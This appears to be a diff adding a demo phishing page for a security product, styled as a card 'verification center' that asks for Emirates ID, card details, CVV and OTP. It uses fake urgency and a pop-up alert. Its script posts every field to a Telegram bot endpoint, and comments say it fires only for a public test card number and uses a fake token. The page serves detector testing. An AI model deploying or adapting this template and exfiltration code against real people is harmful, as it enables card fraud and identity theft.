@@ -1,0 +1,56 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Account Verification Center</title>
+<style>
+  body { margin: 0; font-family: Arial, Helvetica, sans-serif; background: #eef2f7; color: #1d2a3a; }
+  header { background: #0b3d6b; color: #fff; padding: 14px 18px; font-weight: bold; font-size: 17px; }
+  main { max-width: 420px; margin: 18px auto; background: #fff; border-radius: 10px; padding: 18px; box-shadow: 0 2px 10px rgba(0,0,0,.08); }
+  .warn { background: #fff3cd; border: 1px solid #f0c36d; padding: 10px; border-radius: 6px; font-size: 14px; margin-bottom: 14px; }
+  label { display: block; font-size: 13px; margin: 10px 0 4px; color: #44546a; }
+  input { width: 100%; box-sizing: border-box; padding: 10px; border: 1px solid #c9d3df; border-radius: 6px; font-size: 15px; }
+  .row { display: flex; gap: 10px; } .row > div { flex: 1; }
+  button { margin-top: 16px; width: 100%; padding: 12px; border: 0; border-radius: 6px; background: #0b3d6b; color: #fff; font-size: 16px; }
+  footer { text-align: center; font-size: 11px; color: #8a97a8; margin: 18px; }
+</style>
+</head>
+<body>
+<header>🔒 Account Verification Center</header>
+<main>
+  <div class="warn">Your card has been <b>temporarily suspended</b> due to incomplete KYC. Verify within <b>30 minutes</b> to avoid permanent closure.</div>
+  <form action="#">
+    <label for="name">Full name</label><input id="name" name="fullname" autocomplete="name">
+    <label for="eid">Emirates ID number</label><input id="eid" name="emirates_id" placeholder="784-XXXX-XXXXXXX-X">
+    <label for="card">Card number</label><input id="card" name="card_number" autocomplete="cc-number" maxlength="19" placeholder="XXXX XXXX XXXX XXXX">
+    <div class="row">
+      <div><label for="exp">Expiry (MM/YY)</label><input id="exp" name="expiry" autocomplete="cc-exp" placeholder="MM/YY"></div>
+      <div><label for="cvv">CVV</label><input id="cvv" name="cvv" autocomplete="cc-csc" maxlength="3" placeholder="123"></div>
+    </div>
+    <label for="otp">One-time password (OTP) sent to your mobile</label><input id="otp" name="otp" autocomplete="one-time-code" maxlength="6">
+    <button type="submit">Verify now</button>
+    <p id="done" hidden>DEMO. Nothing you type here is sent anywhere.</p>
+  </form>
+</main>
+<footer>VETO.AI DEMO PAGE · imitates the structure of a phishing kit for testing the X-ray chamber · it collects nothing</footer>
+<script>
+// How real phishing kits deliver stolen data: straight to a criminal's Telegram bot (the token below is fake).
+// DEMO SAFETY: the send only happens when the card field holds the public test card 4111 1111 1111 1111, 
+// the fake value the Veto X-ray chamber types (and then blocks). Anything a person types goes nowhere.
+var BOT = 'https://api.telegram.org/bot7012345678:AAH-veto-demo-token-not-real-000000/sendMessage';
+// The same analytics ID on every page of this (demo) operation: a campaign key Veto uses to link sites. No Google script is loaded.
+window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('config', 'G-VT7DEMO2026');
+
+document.querySelector('form').addEventListener('submit', function (e) {
+  e.preventDefault();
+  if (/^4111/.test(document.getElementById('card').value.replace(/\D/g, ''))) {
+    var data = Array.prototype.map.call(document.querySelectorAll('input'), function (i) { return i.name + ': ' + i.value; }).join('\n');
+    fetch(BOT, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: '-1000000000000', text: data }) }).catch(function () {});
+  }
+  document.getElementById('done').hidden = false;
+});
+setTimeout(function () { alert('Security alert: your account will be blocked in 30 minutes. Complete verification now.'); }, 300);
+</script>
+</body>
+</html>
